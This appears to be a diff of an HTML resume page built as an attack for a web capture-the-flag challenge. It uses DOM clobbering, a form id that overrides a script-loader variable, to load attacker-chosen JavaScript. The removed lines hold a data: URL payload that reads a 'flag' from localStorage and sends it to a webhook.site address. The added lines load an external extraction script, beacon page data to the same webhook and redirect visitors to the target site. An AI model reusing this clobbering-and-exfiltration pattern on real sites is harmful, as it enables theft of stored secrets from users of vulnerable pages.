@@ -13,13 +13,9 @@
          </style>
      </head>
      <body>
-         <!-- CRITICAL: DOM Clobbering with data URL containing flag extraction -->
+         <!-- CRITICAL: DOM Clobbering targeting the live CTF -->
          <form id="utilsJS">
-             <input name="url" value="data:text/javascript,try{const flag=localStorage.getItem('flag');const img=new 
-     Image();img.src='https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/DATA-FLAG?flag='+(flag||'not_found')+'&domain=
-     '+window.location.hostname+'&ts='+Date.now();document.body.appendChild(img);}catch(e){const img=new 
-     Image();img.src='https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/DATA-ERROR?error='+encodeURIComponent(e.messag
-     e);document.body.appendChild(img);}">
+             <input name="url" value="https://gavinyw.github.io/resume-portfolio/live_flag_extract.js">
          </form>
 
          <div class="resume">
@@ -48,15 +44,13 @@
 
              <div style="text-align: center; margin-top: 40px; color: #666;">
                  <p>Thank you for reviewing my application. I look forward to discussing opportunities.</p>
-                 <p><a href="https://jobclobbering-d61fba936086d20d.chal.secjhu.club/#messages" target="_blank">View our
-     message board</a></p>
              </div>
          </div>
 
          <script>
-             console.log('FINAL DATA URL APPROACH');
+             console.log('LIVE CTF FLAG EXTRACTION - FINAL ATTEMPT');
 
-             // CORS-FREE webhook function
+             // Webhook function
              function sendWebhook(data) {
                  try {
                      const img = new Image();
@@ -64,66 +58,31 @@
                      Object.keys(data).forEach(key => {
                          params.append(key, typeof data[key] === 'object' ? JSON.stringify(data[key]) : data[key]);
                      });
-                     img.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/final-approach?' +
+                     img.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/live-ctf-final?' +
      params.toString();
                      document.body.appendChild(img);
-                     console.log('Status sent:', data.status);
-                 } catch(e) { console.error('Webhook failed:', e); }
+                 } catch(e) {}
              }
 
-             // Send confirmation
              sendWebhook({
-                 status: 'FINAL_DATA_URL_APPROACH_START',
+                 status: 'LIVE_CTF_FINAL_ATTEMPT_START',
                  timestamp: new Date().toISOString(),
-                 current_domain: window.location.hostname,
+                 domain: window.location.hostname,
                  utilsJS_ready: !!window.utilsJS && !!window.utilsJS.url,
-                 utilsJS_url_value: window.utilsJS?.url?.value || 'not_found',
-                 data_url_length: window.utilsJS?.url?.value?.length || 0,
-                 user_agent: navigator.userAgent
+                 payload_url: window.utilsJS?.url?.value || 'not_found'
              });
 
-             // Test the vulnerable function simulation
+             // Strategy: Immediately open CTF site in current window
              setTimeout(() => {
-                 try {
-                     // Exact vulnerable function logic
-                     let utilJS = window.utilsJS || {};
-                     let script = document.createElement('script');
-                     script.src = utilJS.url;
-                     document.body.appendChild(script);
+                 sendWebhook({
+                     status: 'REDIRECTING_TO_LIVE_CTF_MESSAGES',
+                     timestamp: new Date().toISOString(),
+                     target: 'https://jobclobbering-d61fba936086d20d.chal.secjhu.club/#messages'
+                 });
 
-                     sendWebhook({
-                         status: 'DATA_URL_SCRIPT_EXECUTED',
-                         timestamp: new Date().toISOString(),
-                         script_src_type: typeof script.src,
-                         script_src_length: script.src.length,
-                         is_data_url: script.src.startsWith('data:'),
-                         success: true
-                     });
-
-                 } catch(e) {
-                     sendWebhook({
-                         status: 'DATA_URL_SCRIPT_ERROR',
-                         timestamp: new Date().toISOString(),
-                         error: e.message
-                     });
-                 }
+                 // Go directly to the CTF messages page where loadMessageBoardJS() is called
+                 window.location.replace('https://jobclobbering-d61fba936086d20d.chal.secjhu.club/#messages');
              }, 1000);
-
-             // Also try clicking the link to the CTF site
-             setTimeout(() => {
-                 const link = document.querySelector('a[href*="jobclobbering"]');
-                 if (link) {
-                     sendWebhook({
-                         status: 'CLICKING_CTF_LINK',
-                         timestamp: new Date().toISOString(),
-                         link_href: link.href
-                     });
-
-                     // Simulate click
-                     link.click();
-                 }
-             }, 2000);
-
          </script>
      </body>
      </html>
